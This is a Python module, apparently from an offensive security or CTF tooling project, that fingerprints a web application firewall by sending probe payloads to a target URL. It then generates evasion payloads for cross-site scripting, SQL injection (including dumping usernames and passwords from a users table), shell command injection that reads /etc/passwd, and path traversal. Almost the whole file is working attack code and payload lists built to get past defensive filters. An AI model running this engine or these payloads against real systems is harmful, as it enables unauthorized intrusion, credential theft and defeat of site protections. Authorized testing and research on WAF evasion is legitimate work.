"""WAF Bypass Feedback Loop engine.

Probes target WAF to fingerprint blocked patterns, then generates
bypass payloads that avoid known blocks. Zero LLM cost — pure Python.
"""

from __future__ import annotations

import asyncio
import hashlib
import re
import time
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import quote, urlencode

import httpx
import structlog

logger = structlog.get_logger()


@dataclass
class WafProfile:
    """Fingerprint of a WAF's blocking behavior."""
    domain: str
    waf_vendor: str = "unknown"
    blocked_keywords: set[str] = field(default_factory=set)
    blocked_patterns: set[str] = field(default_factory=set)
    allowed_keywords: set[str] = field(default_factory=set)
    allowed_encodings: set[str] = field(default_factory=set)
    blocked_encodings: set[str] = field(default_factory=set)
    block_status_codes: set[int] = field(default_factory=lambda: {403, 406, 429})
    block_signatures: list[str] = field(default_factory=list)
    max_payload_length: int = 0  # 0 = unknown
    notes: list[str] = field(default_factory=list)
    last_updated: float = 0.0

    def is_blocked(self, keyword: str) -> bool:
        return keyword.lower() in self.blocked_keywords

    def is_allowed(self, keyword: str) -> bool:
        return keyword.lower() in self.allowed_keywords

    def summary(self) -> str:
        parts = [f"WAF: {self.waf_vendor}"]
        if self.blocked_keywords:
            parts.append(f"Blocked keywords: {', '.join(sorted(self.blocked_keywords)[:20])}")
        if self.allowed_keywords:
            parts.append(f"Allowed keywords: {', '.join(sorted(self.allowed_keywords)[:20])}")
        if self.allowed_encodings:
            parts.append(f"Bypass encodings: {', '.join(sorted(self.allowed_encodings))}")
        if self.notes:
            parts.append(f"Notes: {'; '.join(self.notes[:5])}")
        return "\n".join(parts)


# Probe payloads organized by category
_KEYWORD_PROBES = {
    # HTML tags
    "script": "<script>",
    "img": "<img>",
    "svg": "<svg>",
    "iframe": "<iframe>",
    "body": "<body>",
    "input": "<input>",
    "details": "<details>",
    "video": "<video>",
    "audio": "<audio>",
    "marquee": "<marquee>",
    "math": "<math>",
    "object": "<object>",
    "embed": "<embed>",
    "base": "<base>",
    "link": "<link>",
    "style": "<style>",
    "form": "<form>",
    "meta": "<meta>",
    "div": "<div onmouseover=x>",
    "a_href": "<a href=x>",
    # Event handlers
    "onerror": "onerror=x",
    "onload": "onload=x",
    "onclick": "onclick=x",
    "onmouseover": "onmouseover=x",
    "onfocus": "onfocus=x",
    "ontoggle": "ontoggle=x",
    "onafterscriptexecute": "onafterscriptexecute=x",
    "onstart": "onstart=x",
    "oninput": "oninput=x",
    "onbeforeinput": "onbeforeinput=x",
    "onanimationend": "onanimationend=x",
    "onpointerover": "onpointerover=x",
    # JS keywords
    "alert": "alert(1)",
    "confirm": "confirm(1)",
    "prompt": "prompt(1)",
    "eval": "eval(x)",
    "function": "function(){}",
    "constructor": "constructor",
    "document": "document.cookie",
    "window": "window.location",
    "fetch": "fetch(x)",
    "XMLHttpRequest": "XMLHttpRequest",
    # SQL keywords
    "SELECT": "SELECT",
    "UNION": "UNION",
    "AND": "AND 1=1",
    "OR_sql": "OR 1=1",
    "WHERE": "WHERE 1=1",
    "DROP": "DROP TABLE",
    "INSERT": "INSERT INTO",
    "UPDATE": "UPDATE x SET",
    "DELETE_sql": "DELETE FROM",
    "SLEEP": "SLEEP(1)",
    "BENCHMARK": "BENCHMARK(1,1)",
    "WAITFOR": "WAITFOR DELAY",
    "ORDER_BY": "ORDER BY 1",
    "GROUP_BY": "GROUP BY 1",
    "HAVING": "HAVING 1=1",
    "EXTRACTVALUE": "EXTRACTVALUE(1,1)",
    "UPDATEXML": "UPDATEXML(1,1,1)",
    "single_quote": "'",
    "double_quote": '"',
    "comment_dash": "--",
    "comment_hash": "#",
    "comment_slash": "/**/",
    # Command injection
    "semicolon_cmd": "; id",
    "pipe_cmd": "| id",
    "backtick_cmd": "`id`",
    "dollar_paren": "$(id)",
    "ampersand_cmd": "& id",
    "sleep_cmd": "sleep 5",
    # SSTI
    "jinja2": "{{7*7}}",
    "mako": "${7*7}",
    "erb": "<%= 7*7 %>",
    "freemarker": "<#assign x=1>",
    # Path traversal
    "dotdotslash": "../",
    "dotdotbackslash": "..\\",
    "encoded_traversal": "%2e%2e%2f",
}

# Encoding transformations to try
_ENCODING_TRANSFORMS: dict[str, Any] = {
    "url_encode": lambda s: quote(s, safe=""),
    "double_url_encode": lambda s: quote(quote(s, safe=""), safe=""),
    "html_entity_decimal": lambda s: "".join(f"&#{ord(c)};" for c in s),
    "html_entity_hex": lambda s: "".join(f"&#x{ord(c):x};" for c in s),
    "unicode_escape": lambda s: "".join(f"\\u{ord(c):04x}" for c in s),
    "mixed_case": lambda s: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s)),
    "null_byte_insert": lambda s: "%00".join(s),
    "tab_substitute": lambda s: s.replace(" ", "%09"),
    "newline_substitute": lambda s: s.replace(" ", "%0a"),
    "plus_substitute": lambda s: s.replace(" ", "+"),
    "comment_substitute": lambda s: s.replace(" ", "/**/"),
}

# WAF vendor signatures in response
_WAF_SIGNATURES = {
    "cloudflare": ["cloudflare", "cf-ray", "__cfduid", "cf-request-id"],
    "akamai": ["akamai", "akamai-ghost", "ak-reference-id"],
    "aws_waf": ["awselb", "x-amzn-requestid", "aws"],
    "modsecurity": ["mod_security", "modsecurity", "NOYB"],
    "sucuri": ["sucuri", "x-sucuri-id", "cloudproxy"],
    "imperva": ["imperva", "incapsula", "visid_incap"],
    "f5_big-ip": ["big-ip", "bigipserver", "f5"],
    "barracuda": ["barracuda", "barra_counter"],
    "fortiweb": ["fortiweb", "fortigate"],
    "nginx_waf": ["nginx", "openresty"],
    "wordfence": ["wordfence", "wfvt_"],
}


class WafBypassEngine:
    """Adaptive WAF bypass engine with feedback loop.

    Usage:
        engine = WafBypassEngine(scope_guard)
        profile = await engine.fingerprint(target_url, test_param="q")
        bypasses = engine.generate_xss_bypasses(profile)
        bypasses = engine.generate_sqli_bypasses(profile)
    """

    def __init__(self, scope_guard: Any = None, rate_limit: float = 1.0):
        self._scope_guard = scope_guard
        self._rate_limit = rate_limit
        self._profiles: dict[str, WafProfile] = {}

    def has_profile(self, domain: str) -> bool:
        """Check if a WAF profile exists for this domain."""
        return domain in self._profiles

    async def fingerprint(
        self,
        target_url: str,
        test_param: str = "q",
        cookies: dict[str, str] | None = None,
        max_probes: int = 80,
    ) -> WafProfile:
        """Probe the target to fingerprint WAF blocking behavior.

        Args:
            target_url: Base URL to test against.
            test_param: Parameter name to inject probes into.
            cookies: Authentication cookies.
            max_probes: Maximum number of probe requests.

        Returns:
            WafProfile with blocked/allowed keywords and bypass encodings.
        """
        from urllib.parse import urlparse
        domain = urlparse(target_url).netloc

        profile = WafProfile(domain=domain, last_updated=time.time())

        if self._scope_guard:
            self._scope_guard.validate_url(target_url)

        async with httpx.AsyncClient(
            verify=False, timeout=15, follow_redirects=True,
            cookies=cookies or {},
        ) as client:
            # Step 1: Get baseline response (clean request)
            try:
                baseline = await client.get(target_url)
                baseline_status = baseline.status_code
                baseline_length = len(baseline.content)

                # Detect WAF from baseline headers
                profile.waf_vendor = self._detect_waf_vendor(
                    dict(baseline.headers), baseline.text
                )
            except Exception as e:
                profile.notes.append(f"Baseline failed: {e}")
                return profile

            # Step 2: Probe keywords
            probes_sent = 0
            probe_items = list(_KEYWORD_PROBES.items())[:max_probes]

            for keyword, payload in probe_items:
                if probes_sent >= max_probes:
                    break

                await asyncio.sleep(self._rate_limit)
                probes_sent += 1

                try:
                    # Inject payload as parameter value
                    sep = "&" if "?" in target_url else "?"
                    test_url = f"{target_url}{sep}{test_param}={quote(payload, safe='')}"

                    resp = await client.get(test_url)

                    is_blocked = (
                        resp.status_code in profile.block_status_codes
                        or self._has_block_signature(resp.text, resp.headers)
                    )

                    if is_blocked:
                        profile.blocked_keywords.add(keyword.lower())
                        # Capture block signature for future reference
                        if resp.status_code in (403, 406, 429):
                            sig = f"{resp.status_code}:{resp.text[:100]}"
                            if sig not in profile.block_signatures:
                                profile.block_signatures.append(sig)
                    else:
                        profile.allowed_keywords.add(keyword.lower())

                except Exception:
                    continue

            # Step 3: Test encoding bypasses for blocked keywords
            blocked_sample = list(profile.blocked_keywords)[:10]
            for keyword in blocked_sample:
                original_payload = _KEYWORD_PROBES.get(keyword, keyword)

                for enc_name, enc_func in _ENCODING_TRANSFORMS.items():
                    if probes_sent >= max_probes:
                        break

                    await asyncio.sleep(self._rate_limit)
                    probes_sent += 1

                    try:
                        encoded = enc_func(original_payload)
                        sep = "&" if "?" in target_url else "?"
                        test_url = f"{target_url}{sep}{test_param}={quote(str(encoded), safe='')}"

                        resp = await client.get(test_url)

                        is_blocked = (
                            resp.status_code in profile.block_status_codes
                            or self._has_block_signature(resp.text, resp.headers)
                        )

                        if not is_blocked:
                            profile.allowed_encodings.add(enc_name)
                            profile.notes.append(
                                f"Bypass: '{keyword}' passes with {enc_name}"
                            )
                        else:
                            profile.blocked_encodings.add(enc_name)

                    except Exception:
                        continue

        # Cache profile
        self._profiles[domain] = profile

        logger.info(
            "waf_fingerprint_complete",
            domain=domain,
            vendor=profile.waf_vendor,
            blocked=len(profile.blocked_keywords),
            allowed=len(profile.allowed_keywords),
            bypass_encodings=len(profile.allowed_encodings),
            probes=probes_sent,
        )

        return profile

    def generate_xss_bypasses(self, profile: WafProfile) -> list[dict[str, str]]:
        """Generate XSS payloads that bypass the profiled WAF."""
        bypasses: list[dict[str, str]] = []

        # Strategy 1: Use allowed tags + allowed event handlers
        allowed_tags = [
            k for k in profile.allowed_keywords
            if k in {"details", "video", "audio", "marquee", "math",
                     "input", "div", "a_href", "svg", "img", "body",
                     "meta", "object", "embed", "style", "form", "base", "link"}
        ]
        allowed_events = [
            k for k in profile.allowed_keywords
            if k.startswith("on") and k in _KEYWORD_PROBES
        ]

        # Combine allowed tags with allowed event handlers
        tag_map = {
            "details": "<details open {}=alert(1)>",
            "video": "<video><source {}=alert(1)>",
            "audio": "<audio src=x {}=alert(1)>",
            "marquee": "<marquee {}=alert(1)>",
            "math": '<math><mi {}=alert(1)>',
            "input": "<input {} autofocus>",
            "div": "<div {}>",
            "svg": "<svg {}>",
            "img": "<img src=x {}>",
            "body": "<body {}>",
        }
        event_payloads = {
            "ontoggle": "ontoggle=alert(1)",
            "onstart": "onstart=alert(1)",
            "onerror": "onerror=alert(1)",
            "onload": "onload=alert(1)",
            "onfocus": "onfocus=alert(1)",
            "onclick": "onclick=alert(1)",
            "onmouseover": "onmouseover=alert(1)",
            "oninput": "oninput=alert(1)",
            "onbeforeinput": "onbeforeinput=alert(1)",
            "onanimationend": "onanimationend=alert(1)",
            "onpointerover": "onpointerover=alert(1)",
        }

        for tag in allowed_tags:
            template = tag_map.get(tag)
            if not template:
                continue
            for event in allowed_events:
                ep = event_payloads.get(event)
                if not ep:
                    continue
                bypasses.append({
                    "payload": template.format(ep),
                    "technique": f"allowed_tag_{tag}+allowed_event_{event}",
                    "confidence": "high",
                })

        # Strategy 2: Use allowed JS execution methods
        if "confirm" in profile.allowed_keywords and "alert" in profile.blocked_keywords:
            for b in list(bypasses):
                bypasses.append({
                    "payload": b["payload"].replace("alert(1)", "confirm(1)"),
                    "technique": b["technique"] + "+confirm_instead_of_alert",
                    "confidence": "high",
                })
        if "prompt" in profile.allowed_keywords and "alert" in profile.blocked_keywords:
            for b in list(bypasses):
                bypasses.append({
                    "payload": b["payload"].replace("alert(1)", "prompt(1)"),
                    "technique": b["technique"] + "+prompt_instead_of_alert",
                    "confidence": "medium",
                })

        # Strategy 3: Encoding bypasses
        base_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ]
        for enc_name in profile.allowed_encodings:
            enc_func = _ENCODING_TRANSFORMS.get(enc_name)
            if not enc_func:
                continue
            for base in base_payloads:
                try:
                    bypasses.append({
                        "payload": enc_func(base),
                        "technique": f"encoding_{enc_name}",
                        "confidence": "medium",
                    })
                except Exception:
                    continue

        # Strategy 4: Constructor-based execution (no alert/confirm/prompt)
        if "constructor" in profile.allowed_keywords:
            constructor_payloads = [
                "{{constructor.constructor('alert(1)')()}}",
                "[].constructor.constructor('alert(1)')()",
                "''.constructor.constructor('alert(1)')()",
            ]
            for cp in constructor_payloads:
                bypasses.append({
                    "payload": cp,
                    "technique": "constructor_execution",
                    "confidence": "medium",
                })

        # Strategy 5: Polyglot payloads
        if not bypasses:
            # Last resort polyglots
            polyglots = [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
                "'\"-->]]>*/</style></script>--><svg onload=alert()>",
                "\"><img src=x onerror=alert``>",
                "'autofocus/onfocus=alert``//",
            ]
            for p in polyglots:
                bypasses.append({
                    "payload": p,
                    "technique": "polyglot_last_resort",
                    "confidence": "low",
                })

        return bypasses[:30]  # Cap at 30

    def generate_sqli_bypasses(self, profile: WafProfile) -> list[dict[str, str]]:
        """Generate SQLi payloads that bypass the profiled WAF."""
        bypasses: list[dict[str, str]] = []

        # Strategy 1: Comment-based space bypass
        if "comment_slash" in profile.allowed_keywords:
            bypasses.extend([
                {"payload": "'/**/OR/**/1=1--", "technique": "comment_space_bypass", "confidence": "high"},
                {"payload": "'/**/UNION/**/SELECT/**/NULL--", "technique": "comment_union_bypass", "confidence": "high"},
                {"payload": "'/**/AND/**/1=1--", "technique": "comment_and_bypass", "confidence": "high"},
            ])

        # Strategy 2: Tab/newline space bypass
        if "single_quote" in profile.allowed_keywords:
            bypasses.extend([
                {"payload": "'%09OR%091=1--", "technique": "tab_space_bypass", "confidence": "medium"},
                {"payload": "'%0aOR%0a1=1--", "technique": "newline_space_bypass", "confidence": "medium"},
                {"payload": "'+OR+1=1--", "technique": "plus_space_bypass", "confidence": "medium"},
            ])

        # Strategy 3: Operator alternatives
        if "OR_sql" in profile.blocked_keywords:
            bypasses.extend([
                {"payload": "'||1=1--", "technique": "pipe_or_bypass", "confidence": "high"},
                {"payload": "1'||1#", "technique": "pipe_or_hash", "confidence": "medium"},
            ])
        if "AND" in profile.blocked_keywords:
            bypasses.extend([
                {"payload": "'&&1=1--", "technique": "ampersand_and_bypass", "confidence": "medium"},
                {"payload": "' DIV 1=1--", "technique": "div_and_bypass", "confidence": "low"},
            ])

        # Strategy 4: Keyword case variations
        if "SELECT" in profile.blocked_keywords:
            bypasses.extend([
                {"payload": "'/**/UnIoN/**/SeLeCt/**/NULL--", "technique": "mixed_case_bypass", "confidence": "medium"},
                {"payload": "' /*!UNION*/ /*!SELECT*/ NULL--", "technique": "mysql_comment_bypass", "confidence": "medium"},
            ])

        # Strategy 5: Char-based bypass (avoid keyword blacklists)
        bypasses.extend([
            {"payload": "' OR CHAR(49)=CHAR(49)--", "technique": "char_function_bypass", "confidence": "medium"},
            {"payload": "' OR 1 BETWEEN 1 AND 1--", "technique": "between_bypass", "confidence": "medium"},
            {"payload": "' OR 1 IN (1)--", "technique": "in_operator_bypass", "confidence": "medium"},
        ])

        # Strategy 6: Time-based blind with bypass
        if "SLEEP" in profile.blocked_keywords:
            bypasses.extend([
                {"payload": "' OR BENCHMARK(10000000,SHA1('test'))--", "technique": "benchmark_bypass", "confidence": "medium"},
                {"payload": "' OR (SELECT * FROM (SELECT(SLEEP(3)))a)--", "technique": "nested_sleep_bypass", "confidence": "medium"},
            ])

        # Strategy 7: Error-based without common keywords
        bypasses.extend([
            {"payload": "' OR EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "technique": "extractvalue_bypass", "confidence": "medium"},
            {"payload": "' OR UPDATEXML(1,CONCAT(0x7e,version()),1)--", "technique": "updatexml_bypass", "confidence": "medium"},
        ])

        # Strategy 8: Encoding bypasses
        base_sqli = ["' OR 1=1--", "' UNION SELECT NULL--"]
        for enc_name in profile.allowed_encodings:
            enc_func = _ENCODING_TRANSFORMS.get(enc_name)
            if not enc_func:
                continue
            for base in base_sqli:
                try:
                    bypasses.append({
                        "payload": enc_func(base),
                        "technique": f"encoding_{enc_name}",
                        "confidence": "low",
                    })
                except Exception:
                    continue

        # Strategy 9: Scientific Notation (AWS WAF bypass)
        bypasses.extend([
            {"payload": "1e0UNION SELECT NULL,version(),NULL", "technique": "scientific_notation_bypass", "confidence": "high"},
            {"payload": "1e0UNION SELECT NULL,@@version,NULL", "technique": "scientific_notation_mssql", "confidence": "high"},
            {"payload": "0e0UNION SELECT NULL,version(),NULL", "technique": "scientific_notation_zero", "confidence": "medium"},
        ])

        # Strategy 10: JSON-based bypass (Claroty Team82 2022 — bypassed 5 major WAFs)
        bypasses.extend([
            {"payload": "' UNION SELECT JSON_ARRAYAGG(username) FROM users--", "technique": "json_array_bypass", "confidence": "medium"},
            {"payload": "' UNION SELECT JSON_OBJECTAGG(username,password) FROM users--", "technique": "json_object_bypass", "confidence": "medium"},
            {"payload": "' AND JSON_EXTRACT('{\"a\":1}','$.a')=1--", "technique": "json_extract_bypass", "confidence": "medium"},
        ])

        # Strategy 11: Unicode/Fullwidth Characters
        bypasses.extend([
            {"payload": "' \uff35\uff2e\uff29\uff2f\uff2e \uff33\uff25\uff2c\uff25\uff23\uff34 NULL--", "technique": "fullwidth_unicode_bypass", "confidence": "medium"},
            {"payload": "' OR \uff11=\uff11--", "technique": "fullwidth_number_bypass", "confidence": "low"},
        ])

        # Strategy 12: Whitespace Alternatives
        bypasses.extend([
            {"payload": "'%0bOR%0b1=1--", "technique": "vertical_tab_bypass", "confidence": "high"},
            {"payload": "'%0cOR%0c1=1--", "technique": "form_feed_bypass", "confidence": "medium"},
            {"payload": "'%a0OR%a01=1--", "technique": "nbsp_bypass_mysql", "confidence": "medium"},
            {"payload": "'%0dOR%0d1=1--", "technique": "cr_bypass", "confidence": "medium"},
        ])

        # Strategy 13: Backtick and No-Space Syntax (MySQL)
        bypasses.extend([
            {"payload": "' UNION SELECT`version()`--", "technique": "backtick_bypass", "confidence": "medium"},
            {"payload": "'UNION(SELECT(1),(version()),(3))--", "technique": "parentheses_no_space", "confidence": "medium"},
        ])

        # Strategy 14: Double URL Encoding
        if "double_url_encode" in profile.allowed_encodings:
            bypasses.extend([
                {"payload": "%2527 OR 1=1--", "technique": "double_url_encode_quote", "confidence": "high"},
                {"payload": "%2527 UNION SELECT NULL--", "technique": "double_url_encode_union", "confidence": "high"},
            ])

        # Strategy 15: XML Entity Encoding (for XML/SOAP contexts)
        bypasses.extend([
            {"payload": "1 &#x55;NION &#x53;ELECT @@version", "technique": "xml_entity_bypass", "confidence": "medium"},
            {"payload": "1&#x27; OR 1=1--", "technique": "xml_entity_quote", "confidence": "medium"},
        ])

        # Strategy 16: Function Substitutions
        bypasses.extend([
            {"payload": "' OR MID(version(),1,1)>'4'--", "technique": "mid_for_substring", "confidence": "medium"},
            {"payload": "' OR ORD(MID(version(),1,1))>52--", "technique": "ord_for_ascii", "confidence": "medium"},
            {"payload": "' OR version() LIKE '5%'--", "technique": "like_for_equals", "confidence": "medium"},
            {"payload": "' OR version() RLIKE '^5'--", "technique": "rlike_for_equals", "confidence": "medium"},
            {"payload": "' OR STRCMP(LEFT(version(),1),'5')=0--", "technique": "strcmp_for_equals", "confidence": "low"},
        ])

        # Strategy 17: HPP (HTTP Parameter Pollution)
        bypasses.extend([
            {"payload": "1&id=' OR 1=1--", "technique": "hpp_duplicate_param", "confidence": "medium"},
            {"payload": "1/*&id=*/ OR 1=1--", "technique": "hpp_comment_split", "confidence": "low"},
        ])

        # Strategy 18: Hex Encoding
        bypasses.extend([
            {"payload": "' OR 0x313d31--", "technique": "hex_comparison", "confidence": "medium"},
            {"payload": "' UNION SELECT 0x61646D696E--", "technique": "hex_string_bypass", "confidence": "medium"},
        ])

        # Strategy 19: Named WAF-Specific Bypasses
        bypasses.extend([
            # ModSecurity CRS
            {"payload": "' OR {`a]b`}=1--", "technique": "modsecurity_odbc_escape", "confidence": "low"},
            # Cloudflare-specific
            {"payload": "' /*!OR*/ 1 /*!LIKE*/ 1--", "technique": "cloudflare_comment_like", "confidence": "low"},
        ])

        return bypasses[:60]

    def generate_cmdi_bypasses(self, profile: WafProfile) -> list[dict[str, str]]:
        """Generate command injection payloads that bypass the profiled WAF."""
        bypasses: list[dict[str, str]] = []

        # Strategy 1: Use allowed separators
        separators = {
            "semicolon_cmd": ";",
            "pipe_cmd": "|",
            "ampersand_cmd": "&",
            "backtick_cmd": "`",
            "dollar_paren": "$(",
        }
        for key, sep in separators.items():
            if key in profile.allowed_keywords:
                if sep in (";", "|", "&"):
                    bypasses.append({
                        "payload": f"{sep} id",
                        "technique": f"allowed_separator_{sep}",
                        "confidence": "high",
                    })
                elif sep == "`":
                    bypasses.append({
                        "payload": "`id`",
                        "technique": "backtick_execution",
                        "confidence": "high",
                    })
                elif sep == "$(":
                    bypasses.append({
                        "payload": "$(id)",
                        "technique": "dollar_paren_execution",
                        "confidence": "high",
                    })

        # Strategy 2: IFS bypass for space filtering
        bypasses.extend([
            {"payload": ";${IFS}id", "technique": "ifs_space_bypass", "confidence": "medium"},
            {"payload": ";{cat,/etc/passwd}", "technique": "brace_expansion", "confidence": "medium"},
            {"payload": ";\tcat\t/etc/passwd", "technique": "tab_space_bypass", "confidence": "medium"},
        ])

        # Strategy 3: Wildcard bypass
        bypasses.extend([
            {"payload": ";cat${IFS}/et?/pas?wd", "technique": "wildcard_bypass", "confidence": "medium"},
            {"payload": ";cat${IFS}/etc/pass*", "technique": "glob_bypass", "confidence": "medium"},
        ])

        # Strategy 4: Encoding bypass
        bypasses.extend([
            {"payload": "%0aid", "technique": "newline_separator", "confidence": "medium"},
            {"payload": "%0d%0aid", "technique": "crlf_separator", "confidence": "medium"},
        ])

        return bypasses[:20]

    def generate_path_traversal_bypasses(self, profile: WafProfile) -> list[dict[str, str]]:
        """Generate path traversal payloads that bypass the profiled WAF."""
        bypasses: list[dict[str, str]] = []

        # Different traversal encodings
        traversals = [
            ("..%2f", "url_encoded_slash"),
            ("..%252f", "double_url_encoded"),
            ("..%c0%af", "overlong_utf8"),
            ("..%ef%bc%8f", "fullwidth_slash"),
            ("..%c1%9c", "utf8_variant"),
            ("....//", "double_dot_double_slash"),
            ("..;/", "semicolon_bypass"),
            ("..\\/", "backslash_variant"),
            ("..%00/", "null_byte"),
            ("..%0d/", "carriage_return"),
        ]

        for traversal, technique in traversals:
            for target_file in ["/etc/passwd", "/FLAG", "/FLAG.txt"]:
                depth = target_file.count("/")
                path = traversal * (3 + depth) + target_file.lstrip("/")
                bypasses.append({
                    "payload": path,
                    "technique": technique,
                    "confidence": "medium",
                })

        return bypasses[:20]

    def get_profile(self, domain: str) -> WafProfile | None:
        """Get cached WAF profile for a domain."""
        return self._profiles.get(domain)

    @staticmethod
    def _detect_waf_vendor(headers: dict[str, str], body: str) -> str:
        """Detect WAF vendor from response headers and body."""
        combined = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()
        body_lower = body.lower()[:5000]

        for vendor, signatures in _WAF_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in combined or sig.lower() in body_lower:
                    return vendor
        return "unknown"

    @staticmethod
    def _has_block_signature(body: str, headers: Any) -> bool:
        """Check if response contains WAF block signatures."""
        body_lower = body.lower()[:3000]
        block_phrases = [
            "access denied", "forbidden", "blocked", "not acceptable",
            "request blocked", "security violation", "waf", "firewall",
            "malicious", "attack detected", "suspicious request",
            "bad request", "invalid request",
        ]
        return any(phrase in body_lower for phrase in block_phrases)
